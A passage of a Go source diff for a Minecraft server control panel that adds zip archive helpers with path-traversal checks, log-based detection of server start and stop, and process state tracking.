+		rel, err := filepath.Rel(root, path)
+		if err != nil {
+			return err
+		}
+		rel = filepath.ToSlash(rel)
+		header, err := zip.FileInfoHeader(info)
+		if err != nil {
+			return err
+		}
+		header.Name = rel
+		if entry.IsDir() {
+			header.Name += "/"
+			_, err = zw.CreateHeader(header)
+			return err
+		}
+		header.Method = zip.Deflate
+		writer, err := zw.CreateHeader(header)
+		if err != nil {
+			return err
+		}
+		file, err := os.Open(path)
+		if err != nil {
+			return err
+		}
+		defer file.Close()
+		_, err = io.Copy(writer, file)
+		return err
+	})
+}
+
+func unzipTo(source, root string) error {
+	reader, err := zip.OpenReader(source)
+	if err != nil {
+		return err
+	}
+	defer reader.Close()
+	rootAbs, err := filepath.Abs(root)
+	if err != nil {
+		return err
+	}
+	for _, file := range reader.File {
+		name := filepath.Clean(filepath.FromSlash(file.Name))
+		if name == "." || strings.HasPrefix(name, ".."+string(os.PathSeparator)) || filepath.IsAbs(name) {
+			return fmt.Errorf("unsafe zip entry: %s", file.Name)
+		}
+		target := filepath.Join(rootAbs, name)
+		targetAbs, err := filepath.Abs(target)
+		if err != nil {
+			return err
+		}
+		rel, err := filepath.Rel(rootAbs, targetAbs)
+		if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(os.PathSeparator)) {
+			return fmt.Errorf("zip entry escapes server root: %s", file.Name)
+		}
+		if file.FileInfo().IsDir() {
+			if err := os.MkdirAll(targetAbs, file.Mode()); err != nil {
+				return err
+			}
+			continue
+		}
+		if err := os.MkdirAll(filepath.Dir(targetAbs), 0755); err != nil {
+			return err
+		}
+		src, err := file.Open()
+		if err != nil {
+			return err
+		}
+		dst, err := os.OpenFile(targetAbs, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, file.Mode())
+		if err != nil {
+			src.Close()
+			return err
+		}
+		_, copyErr := io.Copy(dst, src)
+		closeErr := dst.Close()
+		src.Close()
+		if copyErr != nil {
+			return copyErr
+		}
+		if closeErr != nil {
+			return closeErr
+		}
+	}
+	return nil
 }
 
 type ConsoleHub struct {
@@ -1234,11 +1744,28 @@ func quoteCommandPart(part string) string {
 	return part
 }
 
+func detectMinecraftReady(line string) bool {
+	return strings.Contains(line, "Done (") && strings.Contains(line, `For help, type "help"`)
+}
+
+func detectMinecraftStopping(line string) bool {
+	return strings.Contains(line, "All RegionFile I/O tasks to complete") ||
+		strings.Contains(line, "[MoonriseCommon] Awaiting termination of worker pool") ||
+		strings.Contains(line, "[MoonriseCommon] Awaiting termination of I/O pool")
+}
+
 type ProcessManager struct {
 	app      *App
 	mu       sync.Mutex
 	runtimes map[string]*Runtime
 }
+
+const (
+	runtimeStopped  = "stopped"
+	runtimeStarting = "starting"
+	runtimeRunning  = "running"
+	runtimeStopping = "stopping"
+)
 
 func NewProcessManager(app *App) *ProcessManager {
 	return &ProcessManager{app: app, runtimes: map[string]*Runtime{}}
@@ -1252,51 +1779,63 @@ func (pm *ProcessManager) Start(server Server) error {
 	}
 	hub := pm.app.consoleHub()
 	args := serverCommandArgs(server)
-	hub.Append(server.ID, fmt.Sprintf("\r\n[mypanel] starting: %s\r\n", commandDisplay(server.JavaPath, args)))
+	hub.Append(server.ID, fmt.Sprintf("\r\n[MyPanel] starting: %s\r\n", commandDisplay(server.JavaPath, args)))
 	root := pm.app.absServerRoot(server)
 	jar, _, err := pm.app.safePath(server, server.Jar)
 	if err != nil {
-		hub.Append(server.ID, fmt.Sprintf("[mypanel] start failed: %v\r\n", err))
+		hub.Append(server.ID, fmt.Sprintf("[MyPanel] start failed: %v\r\n", err))
 		return err
 	}
 	if _, err := os.Stat(jar); err != nil {
 		err = fmt.Errorf("jar not found: %s", server.Jar)
-		hub.Append(server.ID, fmt.Sprintf("[mypanel] start failed: %v\r\n", err))
+		hub.Append(server.ID, fmt.Sprintf("[MyPanel] start failed: %v\r\n", err))
 		return err
 	}
 	cmd := exec.Command(server.JavaPath, args...)
 	cmd.Dir = root
 	stdin, err := cmd.StdinPipe()
 	if err != nil {
-		hub.Append(server.ID, fmt.Sprintf("[mypanel] start failed: %v\r\n", err))
+		hub.Append(server.ID, fmt.Sprintf("[MyPanel] start failed: %v\r\n", err))
 		return err
 	}
 	stdout, err := cmd.StdoutPipe()
 	if err != nil {
-		hub.Append(server.ID, fmt.Sprintf("[mypanel] start failed: %v\r\n", err))
+		hub.Append(server.ID, fmt.Sprintf("[MyPanel] start failed: %v\r\n", err))
 		return err
 	}
 	stderr, err := cmd.StderrPipe()
 	if err != nil {
-		hub.Append(server.ID, fmt.Sprintf("[mypanel] start failed: %v\r\n", err))
+		hub.Append(server.ID, fmt.Sprintf("[MyPanel] start failed: %v\r\n", err))
 		return err
 	}
 	rt := NewRuntime(cmd, stdin)
 	if err := cmd.Start(); err != nil {
-		hub.Append(server.ID, fmt.Sprintf("[mypanel] start failed: %v\r\n", err))
+		hub.Append(server.ID, fmt.Sprintf("[MyPanel] start failed: %v\r\n", err))
 		return err
 	}
-	hub.Append(server.ID, fmt.Sprintf("[mypanel] server process started pid=%d\r\n", cmd.Process.Pid))
+	rt.SetState(runtimeStarting)
+	hub.Append(server.ID, fmt.Sprintf("[MyPanel] server process started pid=%d\r\n", cmd.Process.Pid))
 	pm.runtimes[server.ID] = rt
-	go rt.pipe(stdout, func(msg string) { hub.Append(server.ID, msg) })
-	go rt.pipe(stderr, func(msg string) { hub.Append(server.ID, msg) })
+	appendLine := func(msg string) {
+		hub.Append(server.ID, msg)
+		if detectMinecraftReady(msg) && rt.MarkRunning() {
+			hub.Append(server.ID, "[MyPanel] server marked as running\r\n")
+		}
+		if detectMinecraftStopping(msg) {
+			rt.MarkStopping()
+		}
+	}
+	go rt.pipe(stdout, appendLine)
+	go rt.pipe(stderr, appendLine)
 	go func() {
 		err := cmd.Wait()
 		if err != nil {
-			hub.Append(server.ID, fmt.Sprintf("\r\n[mypanel] process exited: %v\r\n", err))
+			hub.Append(server.ID, fmt.Sprintf("\r\n[MyPanel] process exited: %v\r\n", err))
 		} else {
-			hub.Append(server.ID, "\r\n[mypanel] process exited: code=0\r\n")
+			hub.Append(server.ID, "\r\n[MyPanel] process exited: code=0\r\n")
 		}
+		rt.SetState(runtimeStopped)
+		hub.Append(server.ID, "[MyPanel] server marked as stopped\r\n")
 		pm.mu.Lock()
 		delete(pm.runtimes, server.ID)
 		pm.mu.Unlock()
@@ -1309,23 +1848,24 @@ func (pm *ProcessManager) Stop(serverID string, timeout time.Duration) error {
 	rt, ok := pm.Get(serverID)
 	hub := pm.app.consoleHub()
 	if !ok {
-		hub.Append(serverID, "[mypanel] stop requested but server is not running\r\n")
+		hub.Append(serverID, "[MyPanel] stop requested but server is not running\r\n")
 		return nil
 	}
-	hub.Append(serverID, "[mypanel] stopping: sending \"stop\"\r\n")
+	rt.MarkStopping()
+	hub.Append(serverID, "[MyPanel] stopping: sending \"stop\"\r\n")
 	if err := rt.Write([]byte("stop\n")); err != nil {
-		hub.Append(serverID, fmt.Sprintf("[mypanel] stop write failed: %v\r\n", err))
+		hub.Append(serverID, fmt.Sprintf("[MyPanel] stop write failed: %v\r\n", err))
 	}
 	deadline := time.Now().Add(timeout)
 	for time.Now().Before(deadline) {
-		if !pm.IsRunning(serverID) {
+		if !pm.IsActive(serverID) {
 			return nil
 		}
 		time.Sleep(250 * time.Millisecond)
 	}
-	hub.Append(serverID, "[mypanel] stop timeout; killing process\r\n")
+	hub.Append(serverID, "[MyPanel] stop timeout; killing process\r\n")
 	if err := rt.Kill(); err != nil {
-		hub.Append(serverID, fmt.Sprintf("[mypanel] kill failed: %v\r\n", err))
+		hub.Append(serverID, fmt.Sprintf("[MyPanel] kill failed: %v\r\n", err))
 		return err
 	}
 	return nil
@@ -1339,6 +1879,10 @@ func (pm *ProcessManager) Get(serverID string) (*Runtime, bool) {
 }
 
 func (pm *ProcessManager) IsRunning(serverID string) bool {
+	return pm.State(serverID) == runtimeRunning
+}
+
+func (pm *ProcessManager) IsActive(serverID string) bool {
 	_, ok := pm.Get(serverID)
 	return ok
 }
@@ -1357,15 +1901,24 @@ func (pm *ProcessManager) PID(serverID string) int {
 	return rt.PID()
 }
 
+func (pm *ProcessManager) State(serverID string) string {
+	rt, ok := pm.Get(serverID)
+	if !ok {
+		return runtimeStopped
+	}
+	return rt.State()
+}
+
 type Runtime struct {
 	cmd    *exec.Cmd
 	stdin  io.WriteCloser
 	mu     sync.Mutex
 	closed bool
+	state  string
 }
 
 func NewRuntime(cmd *exec.Cmd, stdin io.WriteCloser) *Runtime {
-	return &Runtime{cmd: cmd, stdin: stdin}
+	return &Runtime{cmd: cmd, stdin: stdin, state: runtimeStarting}
 }
 
 func (rt *Runtime) PID() int {
@@ -1384,6 +1937,39 @@ func (rt *Runtime) Write(data []byte) error {
 	}
 	_, err := stdin.Write(data)
 	return err
+}
+
+func (rt *Runtime) State() string {
+	rt.mu.Lock()
+	defer rt.mu.Unlock()
+	if rt.state == "" {
+		return runtimeStopped
+	}
+	return rt.state
+}
+
+func (rt *Runtime) SetState(state string) {
+	rt.mu.Lock()
+	defer rt.mu.Unlock()
+	rt.state = state
+}
+
+func (rt *Runtime) MarkRunning() bool {
+	rt.mu.Lock()
+	defer rt.mu.Unlock()
+	if rt.state == runtimeRunning || rt.state == runtimeStopping || rt.state == runtimeStopped {
+		return false
+	}
+	rt.state = runtimeRunning
+	return true
+}
+
+func (rt *Runtime) MarkStopping() {
+	rt.mu.Lock()
+	defer rt.mu.Unlock()
+	if rt.state != runtimeStopped {
+		rt.state = runtimeStopping
+	}
 }
 
 func (rt *Runtime) Kill() error {
